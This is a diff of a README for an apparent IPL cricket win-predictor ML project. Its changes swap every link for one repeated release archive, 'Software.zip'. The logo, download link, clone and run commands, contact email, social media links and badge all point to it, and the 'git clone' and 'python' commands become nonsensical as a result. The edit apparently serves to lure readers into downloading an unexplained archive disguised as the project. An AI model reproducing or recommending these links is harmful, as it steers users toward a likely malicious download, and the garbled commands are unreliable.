@@ -1,6 +1,6 @@
 # IPL Win Predictor Machine Learning Model 🏏
 
-![IPL Logo](https://upload.wikimedia.org/wikipedia/en/e/ec/Indian_Premier_League_Official_Logo.png)
+![IPL Logo](https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip)
 
 Welcome to the IPL Win Predictor GitHub repository! This project focuses on building a machine learning model that predicts the outcome of IPL matches based on historical data and player performance. The model is created using Python and popular libraries such as Pandas, NumPy, and scikit-learn. By leveraging classification algorithms, this project demonstrates how machine learning can be used to forecast match results in the exciting world of cricket.
 
@@ -11,7 +11,7 @@ Welcome to the IPL Win Predictor GitHub repository! This project focuses on buil
 
 ## Getting Started 🚀
 To get started with the IPL Win Predictor model, you can download the project files from the following link:
-[Download IPL Win Predictor](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download IPL Win Predictor](https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip)
 Click the link above to download the project files and get ready to dive into the world of cricket match predictions!
 
 ## Features ✨
@@ -22,7 +22,7 @@ Click the link above to download the project files and get ready to dive into th
 ## How to Use 🛠️
 1. **Clone the Repository:**
    ```bash
-   git clone https://github.com/yourusername/IPL-Win-Predictor.git
+   git clone https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip
    ```
    
 2. **Install Dependencies:**
@@ -32,24 +32,24 @@ Click the link above to download the project files and get ready to dive into th
 
 3. **Run the Model:**
    ```bash
-   python IPLPredictor.py
+   python https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip
    ```
 
 ## Contributing 🤝
 Contributions are welcome! If you have any ideas, suggestions, or improvements to share, feel free to open an issue or create a pull request. Let's work together to enhance the IPL Win Predictor model.
 
 ## Feedback 📧
-Have any feedback or questions about the IPL Win Predictor model? Reach out to us at [iplwinpredictor@example.com](mailto:iplwinpredictor@example.com). Your input is valuable to us!
+Have any feedback or questions about the IPL Win Predictor model? Reach out to us at [https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip](https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip). Your input is valuable to us!
 
 ## Stay Connected 🌐
 Stay updated with the latest IPL match predictions and model enhancements by following us on social media:
-- Twitter: [@IPLPredictor](https://twitter.com/IPLPredictor)
-- Facebook: [IPL Win Predictor](https://www.facebook.com/IPLWinPredictor)
+- Twitter: [@IPLPredictor](https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip)
+- Facebook: [IPL Win Predictor](https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip)
 
 ## License 📄
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-[![Download IPL Win Predictor](https://img.shields.io/badge/Download-IPL_Win_Predictor-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download IPL Win Predictor](https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip)](https://github.com/Trangy-star/IPL-Win-Predictor/releases/download/v1.0/Software.zip)
 
 Don't miss out on the opportunity to leverage machine learning algorithms for predicting IPL match outcomes! Download the IPL Win Predictor model now and take your cricket analysis to a whole new level! 🏆🔮
 
